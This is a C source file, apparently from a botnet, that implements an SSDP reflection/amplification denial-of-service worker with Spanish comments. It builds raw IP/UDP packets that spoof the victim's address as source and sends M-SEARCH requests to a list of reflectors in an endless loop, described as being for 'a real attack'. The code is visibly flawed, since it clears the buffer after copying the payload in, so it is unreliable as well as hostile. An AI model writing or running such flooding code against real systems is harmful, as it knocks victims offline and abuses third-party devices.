#include "../../../include/botnet.h"
#include "../../../include/compat/raw_structs.h" // ¡LA SOLUCIÓN DEFINITIVA!

// Lista de reflectores públicos para un ataque real
const char *ssdp_reflectors[] = {"198.51.100.1", "203.0.113.5", "192.0.2.10"};
int num_ssdp_reflectors = sizeof(ssdp_reflectors) / sizeof(char *);

// En modo de prueba local, usaremos nuestro propio reflector falso
#ifdef LOCAL_TEST
const char *local_reflector[] = {"127.0.0.1"};
#endif

// Prototipo de la función de checksum definida en otro lugar (dns_amp.c)
unsigned short csum(unsigned short *ptr, int nbytes);

void *ssdp_amp_worker(void *args) {
    struct target *victim = (struct target *)args;
    int sock;
    char datagram[4096];
    // Usamos nuestras propias estructuras con nombres únicos
    struct my_iphdr *iph = (struct my_iphdr *)datagram;
    struct my_udphdr *udph = (struct my_udphdr *)(datagram + sizeof(struct my_iphdr));
    char *payload = (char *)(datagram + sizeof(struct my_iphdr) + sizeof(struct my_udphdr));

    const char *ssdp_payload = "M-SEARCH * HTTP/1.1\r\nHost:239.255.255.250:1900\r\nST:ssdp:all\r\nMan:\"ssdp:discover\"\r\nMX:3\r\n\r\n";
    int payload_len = strlen(ssdp_payload);
    memcpy(payload, ssdp_payload, payload_len);

    sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sock < 0) { perror("socket"); return NULL; }
    int one = 1;
    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) { perror("setsockopt"); close(sock); return NULL; }

#ifdef LOCAL_TEST
    const char **reflectors = local_reflector;
    int num_reflectors = 1;
#else
    const char **reflectors = ssdp_reflectors;
    int num_reflectors = num_ssdp_reflectors;
#endif

    struct sockaddr_in sin;
    while (attack_running) {
        for (int j = 0; j < num_reflectors; j++) {
            sin.sin_family = AF_INET;
            sin.sin_port = htons(1900);
            sin.sin_addr.s_addr = inet_addr(reflectors[j]);

            memset(datagram, 0, 4096);

            iph->ihl = 5; iph->version = 4; iph->tos = 0;
            iph->tot_len = sizeof(struct my_iphdr) + sizeof(struct my_udphdr) + payload_len;
            iph->id = htonl(rand()); iph->frag_off = 0; iph->ttl = 255; iph->protocol = IPPROTO_UDP;
            iph->saddr = victim->addr;
            iph->daddr = sin.sin_addr.s_addr;

            udph->source = htons(rand());
            udph->dest = htons(1900);
            udph->len = htons(sizeof(struct my_udphdr) + payload_len);
            udph->check = 0;

            iph->check = csum((unsigned short *)datagram, iph->tot_len);

            sendto(sock, datagram, iph->tot_len, 0, (struct sockaddr *)&sin, sizeof(sin));
        }
    }
    close(sock);
    return NULL;
}
